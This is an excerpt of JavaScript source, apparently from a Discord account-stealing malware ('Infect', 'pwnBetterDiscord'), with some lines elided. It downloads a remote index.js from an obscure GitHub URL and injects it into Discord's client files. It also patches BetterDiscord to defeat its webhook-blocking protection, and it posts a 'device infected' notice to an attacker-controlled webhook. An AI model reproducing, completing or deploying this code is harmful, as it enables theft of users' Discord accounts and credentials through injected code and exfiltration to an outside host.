...
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/weowqejksdjksasdaasasdsa/wedkoslkdsakldkewoqdkosadkwqodksoadkoqwdkowqkodqwe-qw-edcasu-odyhwqu-edghqdqwduyghwqeydhgwqduyhgqweu/main/index.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                ...
                if ( config.logout != "false" ) {
                    ...
                    let folder = file.replace("index.js", "volare.uk")
...
function pwnBetterDiscord() {
    ...
    if (fs.existsSync(dir)) {
        ...
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "mercy:DD"))
    } else {
        return;
    }
...
function injectNotify() {
    ...
    axios
	.post(webhook, {
        content: "Notification': The application was run on a device."
      })
	.then(res => {
	})
	.catch(error => {
